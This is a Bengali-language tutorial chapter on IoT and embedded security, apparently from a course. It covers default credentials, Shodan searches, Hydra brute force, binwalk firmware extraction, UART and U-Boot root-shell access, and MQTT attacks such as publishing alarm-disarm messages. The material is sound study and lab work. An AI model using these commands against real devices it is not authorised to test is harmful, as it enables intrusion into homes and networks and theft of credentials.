---
title: 'IoT & Embedded Security'
subtitle: 'Firmware এক্সট্রাকশন ও অ্যানালাইসিস, UART/JTAG ডিবাগিং, default credentials, protocol attack, এবং hardware hacking-এর মূল বিষয়।'
chapter: 25
level: 'advanced'
readingTime: '12 মিনিট'
topics:
  [
    'IoT security',
    'firmware analysis',
    'hardware hacking',
    'UART',
    'JTAG',
    'binwalk',
    'default credentials',
    'embedded systems'
  ]
---

<script>
	import Callout from '$lib/components/content/Callout.svelte';
</script>

## গল্পে বুঝি

একটা নতুন আবাসিক এলাকায় সবাই হুমড়ি খেয়ে সস্তা স্মার্ট দরজার লক কিনল। লকগুলো সুন্দর, ফোন দিয়ে খোলা যায়, দামও কম। কিন্তু একটা ঝামেলা আছে — প্রতিটা লক কারখানা থেকে একই ফ্যাক্টরি কোড "1234" নিয়ে আসে, আর সেই কোডটা প্রতিটা বাক্সের ভেতরের ম্যানুয়ালেই ছাপা থাকে। এলাকার প্রায় কেউই কোডটা বদলানোর কথা ভাবল না — "কে আর কষ্ট করে সেটিংসে গিয়ে বদলাবে?" আবার লকের কোম্পানিটাও একবার বিক্রি করেই খালাস, কোনো নিরাপত্তা আপডেট আর পাঠায় না।

এখন খোয়ারিজমি নামের এক সুযোগসন্ধানী লোক ম্যানুয়াল খুলে সেই "1234" কোডটা দেখে নিল। এই একটামাত্র কোড দিয়েই সে এলাকার হাজার হাজার দরজা একসাথে খুলে ফেলতে পারে — একটা বাড়ি নয়, পুরো পাড়া তার হাতের মুঠোয়। সে চাইলে সব ক'টা লককে একসাথে হুকুম দিয়ে দুষ্টুমিতে নামাতে পারে। কিন্তু সিনা আর ফাতিমা — এলাকার এই দুই সচেতন বাসিন্দা — প্রথম দিনেই ফ্যাক্টরি কোড বদলে নিজেদের গোপন কোড বসিয়েছেন আর লকের নতুন আপডেট এলেই বসিয়ে নেন। খোয়ারিজমির "1234" তাঁদের দরজায় কাজ করে না, তাই তাঁরা নিরাপদ।

এই গল্পটাই আসলে **IoT ও embedded security**। হাজার হাজার লকে একই না-বদলানো ফ্যাক্টরি "1234" কোড = IoT ডিভাইসের **default password** যা সবাই জানে; কোম্পানির আপডেট না পাঠানো = ডিভাইস যেগুলো কদাচিৎ **firmware update** বা security patch পায়; আর একটা কোডে হাজার বাড়ি খুলে ফেলা = mass compromise, ঠিক যেভাবে **botnet** একসাথে অসংখ্য ডিভাইস দখল করে। উল্টোদিকে সিনা আর ফাতিমার সতর্কতাই হলো আসল প্রতিরক্ষা — default বদলাও, নিয়মিত patch/update করো, আর ডিভাইসকে সরাসরি ইন্টারনেটে খোলা রেখো না। বাস্তবেও ২০১৬ সালে **Mirai botnet** ঠিক এই কাজটাই করেছিল — লাখ লাখ IP camera আর router-এর অপরিবর্তিত default password দিয়ে দখল নিয়ে ইতিহাসের অন্যতম বড় DDoS হামলা চালিয়েছিল।

<Callout type="info">

**বাস্তব জীবনের উদাহরণ**

IoT ডিভাইসগুলো হলো এমন কম্পিউটার যেগুলো ডিজাইন করেছেন এমন hardware engineer-রা যাদের একটাই কাজ ছিল: এটাকে সস্তা বানানো। Security ছিল পরের চিন্তা। Default password হলো "admin"। Firmware ডাউনলোড করা যায়। UART port খোলা পড়ে আছে। আর ডিভাইসটা আপনার নেটওয়ার্কেই আছে।

</Callout>

## IoT Attack Surface

```
Network:
  - Default credentials (admin/admin, root/root, root/[blank])
  - Exposed management interfaces (Telnet, SSH, HTTP admin panel)
  - Unencrypted protocols (Telnet, HTTP, MQTT, CoAP, Modbus)
  - UPnP exposing internal services to internet
  - mDNS/Bonjour leaking device info

Hardware:
  - UART console (serial debug port)
  - JTAG (hardware debugging interface)
  - Flash memory (SPI/EEPROM) — extract firmware directly
  - Unprotected boot process (drop to root shell)

Firmware:
  - Hardcoded credentials
  - Outdated Linux kernel with known CVEs
  - Outdated OpenSSL, OpenSSH
  - Debug features left enabled
  - World-readable filesystem with secrets
```

## Network Reconnaissance for IoT

```bash
# Discover IoT devices on network
sudo nmap -sV -p 22,23,80,443,8080,8443,8888,9999 192.168.1.0/24

# Shodan for internet-exposed devices
shodan search "Hikvision" country:US           # IP cameras
shodan search "router admin" country:US        # exposed admin panels
shodan search "default password" country:US
shodan search product:MQTT
shodan search "Server: Boa"                    # common IoT web server

# Default credentials for common devices
# https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
# Router: admin/admin, admin/password, admin/[blank]
# IP cameras: root/root, root/[blank], admin/admin
# SCADA: Many have no authentication at all

# Test default credentials with Hydra
hydra -C /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt \
  192.168.1.1 http-get /
```

## Firmware Acquisition

```bash
# Method 1: Download from vendor website
# Most vendors publish firmware on support pages
wget https://www.vendor.com/firmware/router_v2.3.1.bin

# Method 2: Capture during update
# Intercept the update HTTP request with Wireshark
# Or set up transparent proxy

# Method 3: Extract from device (hardware)
# UART → get shell → dd the flash
# JTAG → halt CPU → read memory
# SPI flash → desolder chip → read with programmer

# Method 4: From running device via shell
dd if=/dev/mtd0 of=/tmp/firmware.bin   # if you have shell access
```

## Firmware Analysis with Binwalk

```bash
# Analyze firmware structure
binwalk firmware.bin

# Common output:
# DECIMAL  HEXADECIMAL  DESCRIPTION
# 0        0x0          TRX firmware header
# 28       0x1C         LZMA compressed data
# 131072   0x20000      Squashfs filesystem, little endian

# Extract all embedded files
binwalk -e firmware.bin
# Creates _firmware.bin.extracted/ directory

# Recursive extraction
binwalk -Me firmware.bin

# List files in extracted filesystem
ls _firmware.bin.extracted/squashfs-root/

# Look for:
# /etc/passwd, /etc/shadow       → user accounts
# /etc/config/                    → device config
ls _firmware.bin.extracted/squashfs-root/etc/
# Private keys, certificates
find _firmware.bin.extracted/ -name "*.pem" -o -name "*.key" -o -name "id_rsa"
# Hardcoded credentials in binaries
grep -r "password\|passwd\|secret" _firmware.bin.extracted/etc/ 2>/dev/null
```

## Firmware Static Analysis

```bash
# Search for passwords
grep -r "admin" _firmware.bin.extracted/etc/ 2>/dev/null
grep -r "root:" _firmware.bin.extracted/etc/passwd 2>/dev/null
cat _firmware.bin.extracted/etc/shadow 2>/dev/null

# Analyze binaries with radare2 / Ghidra
# Copy binaries to analysis machine
cp _firmware.bin.extracted/usr/sbin/httpd ./
file httpd   # architecture: MIPS, ARM, x86?

# Cross-architecture strings
strings httpd | grep -iE "(password|admin|debug|key|secret|token)"

# Import into Ghidra for decompilation
# Set architecture to match firmware (MIPS, ARM Thumb, etc.)

# Find command injection vectors in web server
strings httpd | grep "system\|popen\|execve\|sprintf"
```

## UART — Serial Console Access

UART হলো একটা serial debug port যা বেশিরভাগ embedded ডিভাইসে থাকে। এতে access পাওয়া মানে = interactive shell পাওয়া।

```bash
# Equipment needed:
# - USB-to-UART adapter (CP2102, CH340) ~$5
# - Multimeter or logic analyzer to identify pins
# - Breadboard jumper wires

# Identify UART pins (usually 4 pins: VCC, GND, TX, RX)
# Use multimeter in DC voltage mode:
# VCC: ~3.3V or 5V
# GND: 0V
# TX: voltage oscillates during boot (~1.65V average for 3.3V logic)
# RX: floating or same as VCC

# Find baud rate (common: 115200, 57600, 9600)
# Connect USB-UART:
# Device TX → Adapter RX
# Device RX → Adapter TX
# Device GND → Adapter GND (do NOT connect VCC!)

# Connect with screen or minicom
screen /dev/ttyUSB0 115200
minicom -D /dev/ttyUSB0 -b 115200

# If you see garbled output: wrong baud rate
# If no output: TX/RX swapped — swap connections
# During boot: watch for Linux kernel boot messages, then login prompt
# Or: watch for U-Boot bootloader (can interrupt to get root shell)
```

### U-Boot Exploitation

```bash
# During UART connection, watch for:
# "Hit any key to stop autoboot: 3"
# Press any key → drops to U-Boot shell

# U-Boot commands:
printenv            # print environment variables (may have credentials)
setenv bootargs ... # modify boot arguments
run bootcmd         # execute boot command
boot                # boot with modifications

# Boot with modified kernel args to get root shell:
setenv bootargs "console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=jffs2 init=/bin/sh"
boot

# Now in /bin/sh — mount filesystems:
mount /dev/mtdblock3 /
mount -t proc proc /proc
# Change root password, add SSH key, etc.
```

## Emulating Firmware

```bash
# QEMU — emulate firmware without real hardware
# Good for analysis without destroying a device

# FIRMADYNE — automated firmware emulation
git clone https://github.com/firmadyne/firmadyne
cd firmadyne

# Identify architecture from binaries
file _firmware.bin.extracted/bin/busybox
# busybox: ELF 32-bit LSB executable, MIPS, version 1 (SYSV)

# Emulate with QEMU (MIPS example)
qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta \
  -hda /path/to/disk.img -append "root=/dev/sda1" \
  -nographic -serial mon:stdio

# Simpler: use QEMU user-mode for single binary testing
qemu-mipsel -L _firmware.bin.extracted/ _firmware.bin.extracted/usr/sbin/httpd
```

## MQTT Protocol Attacks

MQTT হলো সবচেয়ে প্রচলিত IoT messaging protocol — প্রায়ই unauthenticated।

```bash
# Discover MQTT brokers
nmap -p 1883,8883 192.168.1.0/24
shodan search product:MQTT port:1883

# Connect to MQTT broker (unauthenticated)
mosquitto_sub -h 192.168.1.100 -p 1883 -t "#" -v
# # = wildcard, subscribes to ALL topics
# Shows all messages on the broker — sensors, control commands, credentials

# Publish malicious commands
mosquitto_pub -h 192.168.1.100 -p 1883 -t "home/lights/1/set" -m '{"state":"OFF"}'
mosquitto_pub -h 192.168.1.100 -p 1883 -t "home/alarm/set" -m '{"state":"disarmed"}'

# Brute force MQTT credentials
# ncrack supports MQTT in newer versions
# Or custom Python script using paho-mqtt
```

## Real Project: Vulnerable IoT Device

```bash
# DVID (Damn Vulnerable IoT Device) — virtual IoT practice
git clone https://github.com/Vulcainreo/DVID
cd DVID
docker-compose up

# Available challenges:
# - Default credential bypass
# - UART console access simulation
# - Firmware analysis (hardcoded credentials)
# - BLE (Bluetooth Low Energy) sniffing
# - MQTT message tampering

# Or: IoTGoat — OWASP's vulnerable firmware
# Based on OpenWrt, contains intentional vulnerabilities
# https://github.com/OWASP/IoTGoat
```

## Common IoT CVEs Pattern

```bash
# Check installed packages against CVE databases
cat _firmware.bin.extracted/etc/opkg/status | grep -E "Package|Version"
# BusyBox 1.23.2 → CVE-2015-9261
# OpenSSL 1.0.2k → CVE-2017-3737, dozens more
# OpenSSH 6.7 → CVE-2016-0777

# Vulnerable telnet (backdoor accounts common!)
grep -r "telnet" _firmware.bin.extracted/etc/ 2>/dev/null
grep -r "backdoor\|debug" _firmware.bin.extracted/ 2>/dev/null

# Hardcoded password patterns:
grep -r "password" _firmware.bin.extracted/etc/ 2>/dev/null
grep -rn "admin\|root\|guest\|service" _firmware.bin.extracted/etc/passwd 2>/dev/null
# Look for: root::0:0 (root with empty password)
```
